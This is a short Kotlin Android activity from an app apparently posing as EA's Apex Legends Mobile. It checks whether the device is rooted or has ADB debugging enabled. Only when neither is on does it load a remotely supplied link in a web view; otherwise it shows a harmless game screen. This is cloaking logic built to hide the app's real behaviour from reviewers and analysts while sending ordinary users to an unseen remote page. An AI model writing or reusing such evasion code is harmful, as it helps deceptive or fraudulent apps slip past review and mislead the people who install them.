package com.ea.gp.apexlegendsmobilef.ui.screens

import android.content.Intent
import android.os.Bundle
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import com.ea.gp.apexlegendsmobilef.R
import com.ea.gp.apexlegendsmobilef.appComponent
import com.ea.gp.apexlegendsmobilef.ui.view_models.FrostViewModel
import com.ea.gp.apexlegendsmobilef.ui.view_models.FrostViewModelFactory
import com.ea.gp.apexlegendsmobilef.utils.Settings
import javax.inject.Inject

class FrostLoadingActivity : AppCompatActivity() {

    @Inject
    lateinit var frostFactory: FrostViewModelFactory

    @Inject
    lateinit var settings: Settings

    private val frostViewModel by viewModels<FrostViewModel> { frostFactory }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_frost_loading)
        appComponent.inject(this)

        if (!settings.isRootsOrAdbEnabled()) {
            frostViewModel.linkLiveData.observe(this) { link ->
                startWebActivity(link)
            }
        } else {
            startGameActivity()
        }
    }

    private fun startWebActivity(link: String) {
        val intent = Intent(this, WebFrostActivity::class.java)
        intent.putExtra("link_extra", link)
        startActivity(intent)
        finish()
    }

    private fun startGameActivity() {
        val intent = Intent(this, GameActivity::class.java)
        startActivity(intent)
        finish()
    }
}